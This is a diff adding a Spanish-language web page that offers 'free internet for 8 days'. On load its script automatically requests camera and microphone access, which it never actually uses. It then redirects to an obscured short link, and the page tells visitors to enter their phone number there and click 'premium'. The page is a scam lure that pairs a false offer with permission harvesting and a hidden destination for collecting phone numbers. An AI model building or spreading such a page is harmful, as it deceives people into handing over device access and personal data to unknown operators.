@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DevHades02 - Internet gratis por solo 8 dias</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #8B5FBF;
+            --primary-dark: #6A3093;
+            --primary-light: #A579D2;
+            --secondary: #FF6B8B;
+            --accent: #00D2FF;
+            --background: #121212;
+            --card-bg: #1E1E1E;
+            --text: #FFFFFF;
+            --text-secondary: #B0B0B0;
+            --border: #333333;
+            --success: #4CAF50;
+            --warning: #FF9800;
+            --danger: #F44336;
+            --radius: 16px;
+            --shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: var(--background);
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* Animaciones */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+
+        @keyframes glow {
+            0% { box-shadow: 0 0 5px var(--primary); }
+            50% { box-shadow: 0 0 20px var(--primary), 0 0 30px var(--primary-light); }
+            100% { box-shadow: 0 0 5px var(--primary); }
+        }
+
+        /* Container principal */
+        .container {
+            max-width: 800px;
+            width: 100%;
+            animation: fadeIn 1s ease;
+        }
+
+        /* Header */
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid var(--primary);
+            box-shadow: 0 0 20px rgba(139, 95, 191, 0.5);
+            animation: float 4s ease-in-out infinite;
+        }
+
+        .logo h1 {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .tagline {
+            font-size: 18px;
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+        }
+
+        /* Card principal */
+        .main-card {
+            background-color: var(--card-bg);
+            border-radius: var(--radius);
+            padding: 40px;
+            box-shadow: var(--shadow);
+            margin-bottom: 30px;
+            border: 1px solid var(--border);
+            text-align: center;
+            animation: fadeIn 1.2s ease;
+        }
+
+        .main-card h2 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: var(--primary);
+        }
+
+        .main-card p {
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.8;
+        }
+
+        /* Permisos section */
+        .permissions-section {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .permission-card {
+            background: rgba(139, 95, 191, 0.1);
+            border-radius: var(--radius);
+            padding: 25px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            border: 1px solid rgba(139, 95, 191, 0.3);
+            transition: var(--transition);
+        }
+
+        .permission-card:hover {
+            transform: translateY(-5px);
+            background: rgba(139, 95, 191, 0.2);
+        }
+
+        .permission-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .permission-info {
+            text-align: left;
+            flex: 1;
+        }
+
+        .permission-info h3 {
+            font-size: 20px;
+            margin-bottom: 8px;
+            color: var(--primary);
+        }
+
+        .permission-info p {
+            color: var(--text-secondary);
+            font-size: 15px;
+        }
+
+        .permission-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+        }
+
+        .status-pending {
+            color: var(--warning);
+        }
+
+        .status-granted {
+            color: var(--success);
+        }
+
+        .status-denied {
+            color: var(--danger);
+        }
+
+        /* Botones */
+        .buttons-container {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .btn {
+            padding: 16px 32px;
+            border-radius: 12px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 16px;
+            min-width: 200px;
+            justify-content: center;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            animation: glow 2s infinite;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            border: 2px solid var(--primary);
+            color: var(--primary);
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        /* Mensajes */
+        .message {
+            padding: 15px 20px;
+            border-radius: var(--radius);
+            margin: 20px 0;
+            text-align: center;
+            font-weight: 500;
+            display: none;
+        }
+
+        .message-success {
+            background: rgba(76, 175, 80, 0.2);
+            border: 1px solid var(--success);
+            color: var(--success);
+        }
+
+        .message-warning {
+            background: rgba(255, 152, 0, 0.2);
+            border: 1px solid var(--warning);
+            color: var(--warning);
+        }
+
+        .message-error {
+            background: rgba(244, 67, 54, 0.2);
+            border: 1px solid var(--danger);
+            color: var(--danger);
+        }
+
+        /* Contador */
+        .countdown {
+            font-size: 18px;
+            text-align: center;
+            margin: 20px 0;
+            color: var(--text-secondary);
+        }
+
+        .countdown-number {
+            font-weight: 700;
+            color: var(--primary);
+            font-size: 24px;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            color: var(--text-secondary);
+            font-size: 14px;
+            padding: 20px;
+            border-top: 1px solid var(--border);
+            width: 100%;
+        }
+
+        .creator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .creator span {
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .permission-card {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .permission-info {
+                text-align: center;
+            }
+
+            .buttons-container {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+            }
+
+            .main-card {
+                padding: 25px;
+            }
+
+            .logo h1 {
+                font-size: 26px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <img src="logo.png" alt="DevHades Logo">
+                <h1>DevHades02</h1>
+            </div>
+            <p class="tagline">hady te da datos gratis ...! </p>
+        </header>
+
+        <div class="main-card">
+            <h2>⚠️importante leer esto⚠️</h2>
+            <p>depues de dar los permisos te dirigirá otro web donde te pedirá tu número ingresas tú número y espera unos 2 minutos y dale click en premium ahí te dará más beneficios </p>
+            
+            <div class="permissions-section">
+                <div class="permission-card">
+                    <div class="permission-icon">
+                        <i class="fas fa-camera"></i>
+                    </div>
+                    <div class="permission-info">
+                        <h3>Permiso de Cámara</h3>
+                        <p>Necesitamos acceso a tu cámara para una mejor comunicación visual.</p>
+                    </div>
+                    <div class="permission-status status-pending" id="cameraStatus">
+                        <i class="fas fa-clock"></i> Pendiente
+                    </div>
+                </div>
+                
+                <div class="permission-card">
+                    <div class="permission-icon">
+                        <i class="fas fa-microphone"></i>
+                    </div>
+                    <div class="permission-info">
+                        <h3>Permiso de Micrófono</h3>
+                        <p>Necesitamos acceso a tu micrófono para una comunicación auditiva óptima.</p>
+                    </div>
+                    <div class="permission-status status-pending" id="microphoneStatus">
+                        <i class="fas fa-clock"></i> Pendiente
+                    </div>
+                </div>
+            </div>
+
+            <div class="message message-warning" id="warningMessage">
+                <i class="fas fa-exclamation-triangle"></i> Es necesario otorgar ambos permisos para continuar.
+            </div>
+
+            <div class="message message-success" id="successMessage">
+                <i class="fas fa-check-circle"></i> ¡Permisos otorgados! Redirigiendo...
+            </div>
+
+            <div class="buttons-container">
+                <button class="btn btn-primary" id="grantPermissionsBtn">
+                    <i class="fas fa-check"></i> Otorgar Permisos
+                </button>
+                <button class="btn btn-secondary" id="retryPermissionsBtn" style="display: none;">
+                    <i class="fas fa-redo"></i> Reintentar
+                </button>
+            </div>
+
+            <div class="countdown" id="countdown" style="display: none;">
+                Redirigiendo en <span class="countdown-number" id="countdownNumber">5</span> segundos...
+            </div>
+        </div>
+
+        <footer>
+            <p>Esta aplicación fue creada para una buena causa</p>
+            <div class="creator">
+                <p>Desarrollado por <span>DevHades02</span></p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Elementos del DOM
+        const grantPermissionsBtn = document.getElementById('grantPermissionsBtn');
+        const retryPermissionsBtn = document.getElementById('retryPermissionsBtn');
+        const cameraStatus = document.getElementById('cameraStatus');
+        const microphoneStatus = document.getElementById('microphoneStatus');
+        const warningMessage = document.getElementById('warningMessage');
+        const successMessage = document.getElementById('successMessage');
+        const countdown = document.getElementById('countdown');
+        const countdownNumber = document.getElementById('countdownNumber');
+
+        // Variables de estado
+        let cameraGranted = false;
+        let microphoneGranted = false;
+        let countdownInterval;
+
+        // Función para solicitar permisos
+        async function requestPermissions() {
+            try {
+                // Solicitar permisos de cámara y micrófono
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+                
+                // Si llegamos aquí, los permisos fueron otorgados
+                cameraGranted = true;
+                microphoneGranted = true;
+                
+                // Actualizar UI
+                cameraStatus.innerHTML = '<i class="fas fa-check-circle"></i> Otorgado';
+                cameraStatus.className = 'permission-status status-granted';
+                
+                microphoneStatus.innerHTML = '<i class="fas fa-check-circle"></i> Otorgado';
+                microphoneStatus.className = 'permission-status status-granted';
+                
+                // Ocultar mensaje de advertencia y botón de reintentar
+                warningMessage.style.display = 'none';
+                retryPermissionsBtn.style.display = 'none';
+                
+                // Mostrar mensaje de éxito
+                successMessage.style.display = 'block';
+                
+                // Detener el stream (no lo necesitamos realmente, solo los permisos)
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Iniciar cuenta regresiva para redirección
+                startCountdown();
+                
+            } catch (error) {
+                console.error('Error al solicitar permisos:', error);
+                
+                // Determinar qué permisos fueron denegados
+                if (error.name === 'NotAllowedError') {
+                    // El usuario denegó los permisos
+                    cameraStatus.innerHTML = '<i class="fas fa-times-circle"></i> Denegado';
+                    cameraStatus.className = 'permission-status status-denied';
+                    
+                    microphoneStatus.innerHTML = '<i class="fas fa-times-circle"></i> Denegado';
+                    microphoneStatus.className = 'permission-status status-denied';
+                    
+                    // Mostrar mensaje de advertencia y botón de reintentar
+                    warningMessage.style.display = 'block';
+                    retryPermissionsBtn.style.display = 'flex';
+                    
+                    // Cambiar texto del botón principal
+                    grantPermissionsBtn.innerHTML = '<i class="fas fa-lock"></i> Permisos Requeridos';
+                    
+                } else if (error.name === 'NotFoundError') {
+                    // No se encontraron dispositivos
+                    alert('No se encontraron dispositivos de cámara o micrófono. Por favor, verifica que estén conectados y funcionando.');
+                } else {
+                    // Otro error
+                    alert('Ocurrió un error al solicitar los permisos. Por favor, inténtalo de nuevo.');
+                }
+            }
+        }
+
+        // Función para iniciar cuenta regresiva
+        function startCountdown() {
+            let seconds = 5;
+            countdown.style.display = 'block';
+            countdownNumber.textContent = seconds;
+            
+            countdownInterval = setInterval(() => {
+                seconds--;
+                countdownNumber.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    redirectToDestination();
+                }
+            }, 1000);
+        }
+
+        // Función para redirigir al destino
+        function redirectToDestination() {
+            window.location.href = 'https://is.gd/EguyAQ';
+        }
+
+        // Función para verificar el estado de los permisos
+        async function checkPermissions() {
+            try {
+                // Verificar permiso de cámara
+                const cameraPermission = await navigator.permissions.query({ name: 'camera' });
+                if (cameraPermission.state === 'granted') {
+                    cameraGranted = true;
+                    cameraStatus.innerHTML = '<i class="fas fa-check-circle"></i> Otorgado';
+                    cameraStatus.className = 'permission-status status-granted';
+                }
+                
+                // Verificar permiso de micrófono
+                const microphonePermission = await navigator.permissions.query({ name: 'microphone' });
+                if (microphonePermission.state === 'granted') {
+                    microphoneGranted = true;
+                    microphoneStatus.innerHTML = '<i class="fas fa-check-circle"></i> Otorgado';
+                    microphoneStatus.className = 'permission-status status-granted';
+                }
+                
+                // Si ambos permisos están otorgados, redirigir
+                if (cameraGranted && microphoneGranted) {
+                    successMessage.style.display = 'block';
+                    startCountdown();
+                }
+            } catch (error) {
+                console.error('Error al verificar permisos:', error);
+            }
+        }
+
+        // Event Listeners
+        document.addEventListener('DOMContentLoaded', function() {
+            // Verificar si los permisos ya están otorgados
+            checkPermissions();
+            
+            // Configurar botones
+            grantPermissionsBtn.addEventListener('click', requestPermissions);
+            retryPermissionsBtn.addEventListener('click', requestPermissions);
+            
+            // Intentar solicitar permisos automáticamente después de un tiempo
+            setTimeout(() => {
+                if (!cameraGranted || !microphoneGranted) {
+                    warningMessage.style.display = 'block';
+                }
+            }, 3000);
+        });
+
+        // Intentar solicitar permisos automáticamente al cargar la página
+        window.addEventListener('load', function() {
+            // Pequeño retraso para que el usuario vea la interfaz primero
+            setTimeout(() => {
+                requestPermissions();
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
